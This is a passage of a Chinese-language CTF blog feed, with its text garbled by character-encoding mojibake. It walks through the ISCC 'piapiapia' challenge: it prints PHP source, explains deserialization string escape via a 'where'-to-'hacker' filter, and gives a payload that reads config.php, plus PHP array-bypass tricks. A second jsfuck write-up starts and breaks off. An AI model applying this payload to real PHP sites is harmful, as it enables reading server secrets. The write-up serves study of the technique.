class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!$user-&gt;is_exists($username)) &#123;</span><br><span class="line">$user-&gt;register($username, $password);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;register.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Register&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;REGISTER&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ˜¯æ³¨å†Œé¡µé¢å¯¹åº”çš„æºç ï¼Œæ²¡ä»€ä¹ˆç‰¹åˆ«çš„</p><p><strong>update.phpï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; $_FILES[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æ›´æ–°profileçš„æºç ã€‚é™åˆ¶ï¼š</p><p>1.ç”µè¯å·ç çš„é•¿åº¦åº”ä¸º11ï¼›</p><p>2.nicknameé•¿åº¦å°äº 10 ä½ï¼Œä¸”åªèƒ½ä¸ºå­—æ¯å’Œæ•°å­—ï¼›ï¼ˆæ³¨æ„æ­¤å¤„çš„<code>^</code>ï¼Œè¿™ä¸ªæ­£åˆ™çš„æ„æ€æ˜¯åŒ¹é…é™¤äº†a-zA-Z0-9_ä¹‹å¤–çš„å­—ç¬¦,å› ä¸º <code>^</code> ç¬¦å·æ˜¯åœ¨ <code>[]</code>é‡Œé¢ï¼Œæ‰€ä»¥æ˜¯éçš„æ„æ€ï¼Œä¸æ˜¯å¼€å§‹çš„æ„æ€ã€‚ï¼‰</p><p>3.å¯¹ä¸Šä¼ çš„ä¿¡æ¯è¿›è¡Œäº†åºåˆ—åŒ–ã€‚</p><p>çœ‹åˆ°è¿™é‡Œçš„æ—¶å€™æˆ‘è¿˜ä»¥ä¸ºä¼šä¸ä¼šæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯å‘ç°ä»–æ²¡æœ‰å‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶ä¸Šä¼ åœ°å€ï¼Œå› æ­¤æ— æ³•è¿›ä¸€æ­¥æ“ä½œï¼Œé‚£å°±æ¥ç€å¾€ä¸‹çœ‹å§</p><p><strong>profile.php</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="literal">null</span>) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Hi <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $nickname;<span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $phone;<span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">&lt;label&gt;Email: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $email;<span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–­å‚æ•°profileçš„å€¼æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™ååºåˆ—åŒ–profileï¼Œç„¶åæŠŠå¯¹åº”å€¼å›æ˜¾åˆ°ç½‘é¡µä¸Š</p><p><strong>æˆ‘ä»¬å…ˆåœ¨æ¥æ¢³ç†ä¸€ä¸‹æ€è·¯ï¼š</strong></p><p>1.flagåœ¨config.phpæ–‡ä»¶é‡Œï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•ç›´æ¥è·å–flagï¼›</p><p>2.update.phpå¯¹ä¸Šä¼ çš„æ•°æ®åšåºåˆ—åŒ–å¤„ç†ï¼›</p><p>3.profile.phpä¼šæŠŠupdateçš„æ•°æ®ååºåˆ—åŒ–ç„¶åå›æ˜¾åˆ°ç½‘é¡µä¸Šï¼Œå¹¶ä¸”å‚æ•°photoä¼šä»¥base64çš„æ–¹å¼è¯»å–ä¸Šä¼ å›¾ç‰‡ï¼›</p><p>4.nicknameé•¿åº¦å°äº 10 ä½ï¼Œä¸”åªèƒ½ä¸ºå­—æ¯å’Œæ•°å­—ã€‚</p><p>æ®æ­¤æˆ‘ä»¬ä¼šæƒ³èƒ½ä¸èƒ½åˆ©ç”¨file_get_contentså‡½æ•°è·å–æœåŠ¡å™¨ç«¯çš„config.phpæ–‡ä»¶ï¼Œè¿™å°±æ¶‰åŠåˆ°äº†<strong>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</strong>ã€‚</p><p><strong>PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>&#125;</code> ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„</strong></p><p>å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o:1:&#123;s:4:&quot;name&quot;;s:6:&quot;linbei&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ç¯¡æ”¹nameçš„å€¼ï¼Œåœ¨nameçš„åœ°æ–¹è¾“å…¥<code>name&quot;;s:5:&quot;linmu&quot;;&#125;</code>ï¼Œåˆ™åºåˆ—åŒ–åå˜æˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o:1:&#123;s:19:&quot;name&quot;;s:5:&quot;linmu&quot;;&#125;&quot;;s:6:&quot;linbei&quot;;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ç¬¬ä¸€ä¸ªsçš„å€¼åŸæœ¬æ˜¯4çš„ä½†æ˜¯æ­¤æ—¶å´æ˜¯19ï¼Œé‚£ä¹ˆè¿™æ ·çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–å<code>&quot;;s:6:&quot;linbei&quot;;&#125;</code>è¿˜æ˜¯æ— æ³•é€ƒé€¸ï¼Œä¹Ÿå°±æ˜¯è¯´<code>s:5:&quot;linmu&quot;</code>æ²¡æœ‰é¡¶æ›¿å…¶çš„ä½ç½®ï¼Œä½†æ˜¯å¥½åœ¨class.phpæ–‡ä»¶ä¸­æœ‰filterï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨filterçš„åŠŸèƒ½æŠŠå­—ç¬¦ä¸²ä¸­å­˜åœ¨çš„<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>æ›¿æ¢æˆ<code>&#39;hacker&#39;</code>ï¼Œå…¶ä¸­ç¬¦åˆæ›¿æ¢åé•¿åº¦å¢åŠ çš„åªæœ‰<code>where</code>ã€‚</p><p>æˆ‘ä»¬å¸Œæœ›ä¸Šä¼ åæ•°æ®åºåˆ—åŒ–å˜æˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:11:&quot;11111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:38:&quot;abc&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:*:******;&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯æŠŠåŸæœ¬$photoå¯¹åº”åºåˆ—åŒ–çš„å€¼é¡¶æ‰ï¼Œæ¢æˆæˆ‘ä»¬å¸Œæœ›çš„config.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦è®©<code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>é€ƒé€¸</p><p><code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>é•¿åº¦ä¸º34ï¼Œå½“å­—ç¬¦ä¸²ä¸­å‡ºç°ä¸€ä¸ªwhereæ—¶ï¼Œæ›¿æ¢åå¢åŠ ä¸€ä¸ªé•¿åº¦ï¼Œå½“å‡ºç°34ä¸ªwhereæ—¶ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²å¢åŠ 34ä¸ªé•¿åº¦ï¼Œæ­¤æ—¶è¯»å–é‡sä¸å˜ï¼Œå¢åŠ çš„é•¿åº¦å°±æŠŠ<code>;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>é¡¶å‡ºå»äº†ã€‚</p><p>ä½†æ˜¯è¿™æ—¶åˆé¢ä¸´ä¸€ä¸ªé—®é¢˜ï¼šnicknameçš„å€¼æœ‰é•¿åº¦é™åˆ¶ï¼Œç”±äºstrlen()å‡½æ•°æ— æ³•åˆ¤åˆ«æ•°ç»„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠ“åŒ…æ›´æ”¹nicknameå±æ€§ä¸ºæ•°ç»„</p><p>æˆ‘ä»¬è¯•ç€æ„é€ payloadï¼š</p><p>$phone =<code> 11111111111</code><br>$email = <code>11111@qq.com</code><br>$nickname[] = <code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code><br>$photo = éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ»¡è¶³è¦æ±‚çš„æ–‡ä»¶</p><p><img src="/2021ISCC.assets/13.png" alt="13"></p><p>ä¸Šä¼ æˆåŠŸï¼š<img src="/2021ISCC.assets/14.png" alt="14"></p><p>base64è§£ç ï¼š<img src="/2021ISCC.assets/15.png" alt="15"></p><p>spï¼šéƒ¨åˆ†å‡½æ•°çš„æ•°ç»„ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sha1(Array()) &#x3D; null</span><br><span class="line">ereg(pattern,Array()) &#x3D;null</span><br><span class="line">preg_match(pattern,Array()) &#x3D; false</span><br><span class="line">strcmp(Array(), â€œabcâ€) &#x3D;null</span><br><span class="line">strpos(Array(),â€œabcâ€) &#x3D; null</span><br><span class="line">strlen(Array()) &#x3D; null</span><br><span class="line">md5(Array()) &#x3D; null</span><br></pre></td></tr></table></figure><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_43622442/article/details/105751356">https://blog.csdn.net/qq_43622442/article/details/105751356</a></p><p><a href="https://blog.csdn.net/qq_43054896/article/details/105586792">https://blog.csdn.net/qq_43054896/article/details/105586792</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;webï¼šISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰â€”â€”å…³äºjså‰ç«¯&quot;&gt;&lt;a href=&quot;#webï¼šISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰â€”â€”å…³äºjså‰ç«¯&quot; class=&quot;headerlink&quot; title=&quot;webï¼šISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰â€”â€”å…³äºjså‰ç«¯&quot;&gt;&lt;/a&gt;webï¼šISCCå®¢æœå†²å†²å†²ï¼ˆ</summary>
      
    
    
    
    
    <category term="ISCC" scheme="http://example.com/tags/ISCC/"/>
    
  </entry>
  
  <entry>
    <title>iæ˜¥ç§‹</title>
    <link href="http://example.com/2021/04/29/i%E6%98%A5%E7%A7%8B2/"/>
    <id>http://example.com/2021/04/29/i%E6%98%A5%E7%A7%8B2/</id>
    <published>2021-04-29T02:17:47.000Z</published>
    <updated>2021-05-22T12:05:11.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›brokenâ€”â€”ï¼ˆjsfuckï¼‰"><a href="#2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›brokenâ€”â€”ï¼ˆjsfuckï¼‰" class="headerlink" title="2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›brokenâ€”â€”ï¼ˆjsfuckï¼‰"></a>2017ç¬¬äºŒå±Šå¹¿ä¸œçœå¼ºç½‘æ¯çº¿ä¸Šèµ›brokenâ€”â€”ï¼ˆjsfuckï¼‰</h1><p>æ‰“å¼€å®¹å™¨ï¼š</p><p><img src="/i%E6%98%A5%E7%A7%8B2.assets/1.png" alt="1"></p><p>ç‚¹å¼€æ–‡ä»¶ï¼š<img src="/i%E6%98%A5%E7%A7%8B2.assets/2.png"></p><p>å‘ç°å…¨æ˜¯è¿™æ ·çš„ä¹±ç ï¼ŒæŸ¥é˜…èµ„æ–™å‘ç°è¿™æ˜¯ä¸€ç§jsfuckç¼–ç ï¼šJSFuck å¯ä»¥è®©ä½ åªç”¨ 6 ä¸ªå­—ç¬¦<code>[</code> <code>]</code> <code>(</code> <code>)</code> <code>!</code> <code>+</code>æ¥ç¼–å†™ JavaScript ç¨‹åºã€‚</p><p>æˆ‘ä»¬èµ‹å€¼è¿™æ®µå­—ç¬¦ä¸²ï¼Œè´´åœ¨æ§åˆ¶å°<img src="/i%E6%98%A5%E7%A7%8B2.assets/3.png"></p><p>ç‚¹å‡»<code>&#123;&#125;</code>ç¾åŒ–è¡¨è¾¾å¼ï¼Œè¿è¡Œå‘ç°æŠ¥é”™ï¼Œå¯¹æ¯”ä¸€ä¸‹è¡¨è¾¾å¼ï¼Œå‘ç°ç¬¬ä¸€è¡Œçš„<code>[</code>æ²¡æœ‰å¯¹åº”<code>]</code>åŒ¹é…ï¼Œæˆ‘ä»¬æŠŠå®ƒåŠ ä¸Šï¼Œé¡µé¢å¼¹å‡ºä¸€ä¸ªçª—å£<img src="/i%E6%98%A5%E7%A7%8B2.assets/5.png" alt="5"></p><p><img src="/i%E6%98%A5%E7%A7%8B2.assets/4.png" alt="4"></p><p>æˆ‘ä»¬çŒœæµ‹å¼¹å‡ºè¿™ä¸ªçª—å£çš„æºç æˆ–ä¸ºalert(â€˜flag is not hereâ€™)ï¼ŒæŠŠè¿™æ®µæºç jsfuckç¼–ç ï¼Œå‘ç°å…¶é•¿åº¦ä¹Ÿä¸è¿‡26806ï¼Œè€Œä¸Šé¢jsfuckè¡¨è¾¾å¼çš„é•¿åº¦æœ‰127763ï¼Œè¯´æ˜è¿™å…¶ä¸­è¿˜æœ‰åˆ«çš„ä»£ç ï¼Œè€Œflagå¾ˆæœ‰å¯èƒ½è—åœ¨å…¶ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å°±æƒ³æ€ä¹ˆèƒ½è·å¾—æºç å‘¢ï¼Ÿ</p><p>æŸ¥çœ‹äº†wpä»–æ˜¯è¯´æŠŠç»“å°¾çš„<code>()</code>åˆ å»ï¼Œå†è¡¥ä¸ª<code>]</code>ï¼ŒåŒæ—¶æŠŠåˆšå¼€å§‹æ—¶è¡¥çš„<code>]</code>åˆ å»</p><p>è§£é‡Šæ˜¯è¯¥æ®µä»£ç æœ€å()ä»£è¡¨çš„æ˜¯å‡½æ•°çš„ç»“å°¾ï¼Œæ‰€ä»¥åªè¦æŠŠæœ€åè¿™ä¸ªæ‹¬å·åˆ æ‰å°±ä¸ä¼šå¼¹æ¡†äº†</p><p><img src="/i%E6%98%A5%E7%A7%8B2.assets/6.png" 